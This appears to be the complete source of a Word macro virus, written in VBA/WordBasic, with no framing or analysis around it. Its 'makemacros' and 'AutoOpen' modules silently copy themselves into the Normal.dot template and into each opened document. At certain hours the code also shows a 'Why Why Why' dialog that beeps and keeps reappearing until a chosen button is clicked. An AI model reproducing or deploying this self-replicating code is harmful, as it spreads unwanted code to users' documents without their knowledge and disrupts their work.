   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "makemacros"

   Public Sub MAIN()
   Dim Count_
   Dim infect
   Dim i
   Dim t$
   Dim rightnow
   Dim buttom
   '***** makemacros *****
   '***** Copy macro to Normal.dot *****
   On Error Resume Next
   Count_ = WordBasic.CountMacros(0)
   infect = 0
   For i = 1 To Count_
     If WordBasic.[MacroName$](i, 0) = "makemacros" Then infect = 1
   Next i

   If infect = 0 Then
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:makemacros"
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:AutoOpen"
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:AutoClose"
      GoTo checktime
   End If

   '***** Copy macro to file *****
   Count_ = WordBasic.CountMacros(1)
   infect = 0
   For i = 1 To Count_
      If WordBasic.[MacroName$](i, 1) = "makemacros" Then infect = 1
   Next i
   If infect = 0 Then
      WordBasic.FileSaveAs Format:=1
      WordBasic.MacroCopy "Normal.Dot:makemacros", WordBasic.[FileName$]() + ":makemacros"
      WordBasic.MacroCopy "Normal.Dot:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   End If

   '***** Dialog *****
   checktime:
   Dim dlg As Object
   WordBasic.BeginDialog 374, 218, "Why Why Why"
       WordBasic.Text 72, 27, 183, 17, "Why doesn't pepole work?", "Text1"
       WordBasic.PushButton 91, 65, 152, 21, "No money", "Push1"
       WordBasic.PushButton 91, 93, 150, 21, "No drink", "Push2"
       WordBasic.PushButton 91, 122, 152, 21, "No eat", "Push3"
       WordBasic.PushButton 92, 152, 150, 21, "No instant noodles", "Push4"
       WordBasic.PushButton 91, 181, 150, 21, "No lunch box", "Push5"
   WordBasic.EndDialog
   Set dlg = WordBasic.CurValues.UserDialog

   '***** check answer *****
   While t$ <> "True"
     rightnow = WordBasic.Hour(WordBasic.Now())
     If t$ = "False" Then
        WordBasic.Beep
        WordBasic.MsgBox "No! No! NO!"
   End If
     t$ = "False"
     Select Case rightnow
       Case 9
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 2 Then t$ = "True"
       Case 12
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 5 Then t$ = "True"
       Case 18
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 4 Then t$ = "True"
       Case 24
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 1 Then t$ = "True"
       Case 17
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 3 Then t$ = "True"
       Case Else
           t$ = "True"
     End Select
   Wend
   If buttom > 0 Then
       WordBasic.MsgBox "Yes, we need."
   End If

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Count_
   Dim infect
   Dim i
   Dim t$
   Dim rightnow
   Dim buttom
   '***** makemacros *****
   '***** Copy macro to Normal.dot *****
   On Error Resume Next
   Count_ = WordBasic.CountMacros(0)
   infect = 0
   For i = 1 To Count_
     If WordBasic.[MacroName$](i, 0) = "makemacros" Then infect = 1
   Next i

   If infect = 0 Then
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:makemacros"
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:AutoOpen"
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":makemacros", "Normal.dot:AutoClose"
      GoTo checktime
   End If

   '***** Copy macro to file *****
   Count_ = WordBasic.CountMacros(1)
   infect = 0
   For i = 1 To Count_
      If WordBasic.[MacroName$](i, 1) = "makemacros" Then infect = 1
   Next i
   If infect = 0 Then
      WordBasic.FileSaveAs Format:=1
      WordBasic.MacroCopy "Normal.Dot:makemacros", WordBasic.[FileName$]() + ":makemacros"
      WordBasic.MacroCopy "Normal.Dot:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   End If

   '***** Dialog *****
   checktime:
   Dim dlg As Object
   WordBasic.BeginDialog 374, 218, "Why Why Why"
       WordBasic.Text 72, 27, 183, 17, "Why doesn't pepole work?", "Text1"
       WordBasic.PushButton 91, 65, 152, 21, "No money", "Push1"
       WordBasic.PushButton 91, 93, 150, 21, "No drink", "Push2"
       WordBasic.PushButton 91, 122, 152, 21, "No eat", "Push3"
       WordBasic.PushButton 92, 152, 150, 21, "No instant noodles", "Push4"
       WordBasic.PushButton 91, 181, 150, 21, "No lunch box", "Push5"
   WordBasic.EndDialog
   Set dlg = WordBasic.CurValues.UserDialog

   '***** check answer *****
   While t$ <> "True"
     rightnow = WordBasic.Hour(WordBasic.Now())
     If t$ = "False" Then
        WordBasic.Beep
        WordBasic.MsgBox "No! No! NO!"
   End If
     t$ = "False"
     Select Case rightnow
       Case 9
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 2 Then t$ = "True"
       Case 12
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 5 Then t$ = "True"
       Case 18
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 4 Then t$ = "True"
       Case 24
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 1 Then t$ = "True"
       Case 17
           buttom = WordBasic.Dialog.UserDialog(dlg)
           If buttom = 3 Then t$ = "True"
       Case Else
           t$ = "True"
     End Select
   Wend
   If buttom > 0 Then
       WordBasic.MsgBox "Yes, we need."
   End If

   End Sub
